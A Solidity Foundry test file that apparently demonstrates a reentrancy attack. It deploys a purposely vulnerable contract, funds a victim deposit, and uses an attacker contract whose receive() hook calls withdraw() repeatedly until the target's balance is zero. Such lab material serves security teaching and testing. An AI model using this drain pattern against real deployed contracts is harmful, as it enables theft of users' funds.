// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../contracts/ReentrancyVuln.sol";

contract ReentrancyTest is Test {
    ReentrancyVuln vulnerableContract;
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function setUp() public {
        vulnerableContract = new ReentrancyVuln();
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        vm.prank(victim);
        vulnerableContract.deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        vm.startPrank(attacker);
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vulnerableContract));
        attackerContract.attack{value: 1 ether}();
        vm.stopPrank();

       assertEq(address(vulnerableContract).balance, 0, "Reentrancy attack successful");
 }
}

contract ReentrancyAttacker {
    ReentrancyVuln public target;

    constructor(address _target) {
        target = ReentrancyVuln(_target);
    }

    function attack() public payable {
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}
